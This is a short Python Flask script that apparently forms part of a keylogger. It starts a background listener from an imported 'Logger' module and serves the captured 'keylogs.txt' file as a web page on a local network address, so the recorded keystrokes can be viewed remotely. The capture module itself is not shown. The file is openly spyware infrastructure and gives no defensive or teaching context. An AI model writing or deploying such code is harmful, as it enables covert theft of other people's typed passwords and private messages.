from flask import Flask, render_template
import Logger
import threading


app = Flask(__name__)


@app.route('/')
def hello():
    with open("keylogs.txt", "r") as f:
        content = f.read()
    return render_template("template.html", content=content)


if __name__ == '__main__':
    threading.Thread(target=Logger.listen, args=()).start()

    app.run(host="192.168.0.100")

    print("2")
